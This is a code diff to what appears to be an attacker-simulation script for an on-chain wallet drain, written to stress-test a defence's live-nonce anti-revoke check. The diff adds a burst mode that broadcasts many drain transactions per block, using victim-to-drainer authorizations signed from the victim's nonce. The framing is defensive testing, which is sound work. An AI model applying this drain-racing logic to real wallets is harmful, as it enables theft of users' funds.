@@ -115,8 +115,14 @@ async function main() {
   // exactly as make-window signs ours. One authorization per victim nonce across the window.
   const victimNonce = await client.getTransactionCount({ address: victim.address });
   const windowBlocks = Number(latestStart - sprayStart);
-  const attemptCount = Math.max(1, windowBlocks + 2);
+  // MAX_RACE bursts this many drains per block instead of one, to march the victim nonce as fast as
+  // the sponsor's inflight gas budget allows. It is the stress test for arm's live-nonce anti-revoke,
+  // which tolerates only AUTHS_PER_ATTEMPT (4) nonces of drift between its live read and the block
+  // (Q30's open frontier). RACE=1 is the ordinary attacker; RACE=10 marches ~10 victim nonces/block.
+  const RACE = Math.max(1, Math.min(40, Number(process.env.MAX_RACE ?? 1)));
+  const attemptCount = Math.max(1, (windowBlocks + 2) * RACE);
   const windowSize = attemptCount + AUTHS_PER_ATTEMPT + 2;
+  if (RACE > 1) console.log(`MAX_RACE=${RACE}: bursting ~${RACE} drains/block to outrun the live-auth 4-nonce spread`);
   console.log(`\nsigning ${windowSize} victim->drainer authorizations from nonce ${victimNonce}...`);
   const authWindow: SignedAuthorization[] = [];
   for (let i = 0; i < windowSize; i++) {
@@ -156,7 +162,7 @@ async function main() {
       broadcastAll(CHAIN_ID, raw, urls)
         .then((h) => console.log(`  drain #${sprayed} sponsor-nonce=${sponsorBase + sprayed - 1} ${h ?? 'REJECTED'}`))
         .catch(() => {});
-      await sleep(Math.round(0.301 * 1000));
+      await sleep(Math.round(301 / RACE)); // RACE drains per block (301ms) when MAX_RACE > 1
       continue;
     }
 
